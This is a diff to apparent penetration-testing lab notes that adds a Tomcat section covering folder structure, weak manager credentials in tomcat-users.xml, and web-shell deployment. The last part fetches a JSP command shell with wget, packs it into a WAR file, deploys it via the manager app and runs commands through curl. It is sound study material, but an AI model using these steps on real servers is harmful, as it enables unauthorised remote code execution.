@@ -6,6 +6,9 @@
     - [PHP Filter Module](#php-filter-module)
     - [Uploading a Backdoored Module](#uploading-a-backdoored-module)
     - [Drupalgeddon](#drupalgeddon)
+- [Tomcat](#tomcat)
+    - [Enumeration](#enumeration-2)
+    - [WAR File Upload](#war-file-upload)
 
 ## Joomla
 ### Enumeration
@@ -168,3 +171,126 @@ curl -s http://drupal-dev.inlanefreight.local/hello.txt
 ```
 
 - Modify the script to gain remote code execution by uploading a malicious PHP file.
+
+## Tomcat
+### Enumeration
+- This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.
+```
+├── bin
+├── conf
+│   ├── catalina.policy
+│   ├── catalina.properties
+│   ├── context.xml
+│   ├── tomcat-users.xml
+│   ├── tomcat-users.xsd
+│   └── web.xml
+├── lib
+├── logs
+├── temp
+├── webapps
+│   ├── manager
+│   │   ├── images
+│   │   ├── META-INF
+│   │   └── WEB-INF
+|   |       └── web.xml
+│   └── ROOT
+│       └── WEB-INF
+└── work
+    └── Catalina
+        └── localhost
+```
+- Each folder inside webapps is expected to have the following structure:
+```
+webapps/customapp
+├── images
+├── index.jsp
+├── META-INF
+│   └── context.xml
+├── status.xsd
+└── WEB-INF
+    ├── jsp
+    |   └── admin.jsp
+    └── web.xml
+    └── lib
+    |    └── jdbc_drivers.jar
+    └── classes
+        └── AdminServlet.class
+```
+- The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes
+- All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information.
+- The `jsp` folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.
+- Here’s an example web.xml file:
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
+
+<web-app>
+  <servlet>
+    <servlet-name>AdminServlet</servlet-name>
+    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
+  </servlet>
+
+  <servlet-mapping>
+    <servlet-name>AdminServlet</servlet-name>
+    <url-pattern>/admin</url-pattern>
+  </servlet-mapping>
+</web-app>
+```
+- The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<SNIP>
+  
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+<!--
+  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary.
+
+  Built-in Tomcat manager roles:
+    - manager-gui    - allows access to the HTML GUI and the status pages
+    - manager-script - allows access to the HTTP API and the status pages
+    - manager-jmx    - allows access to the JMX proxy and the status pages
+    - manager-status - allows access to the status pages only
+
+  The users below are wrapped in a comment and are therefore ignored. If you
+  wish to configure one or more of these users for use with the manager web
+  application, do not forget to remove the <!.. ..> that surrounds them. You
+  will also need to set the passwords to something appropriate.
+-->
+
+   
+ <SNIP>
+  
+!-- user manager can access only manager section -->
+<role rolename="manager-gui" />
+<user username="tomcat" password="tomcat" roles="manager-gui" />
+
+<!-- user admin can access manager and admin section both -->
+<role rolename="admin-gui" />
+<user username="admin" password="admin" roles="manager-gui,admin-gui" />
+
+
+</tomcat-users>
+```
+- The file shows us what each of the roles manager-gui, manager-script, manager-jmx, and manager-status provide access to. In this example, we can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin
+
+### WAR File Upload
+- The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive:
+```bash
+abdeonix@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+abdeonix@htb[/htb]$ zip -r backup.war cmd.jsp 
+
+```
+- Click on Browse to select the .war file and then click on Deploy.
+![Mgr_Deploy](/images/mgr_deploy.png)
+- This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
+![WAR_Deployed](/images/war_deployed.png)
+```bash
+curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
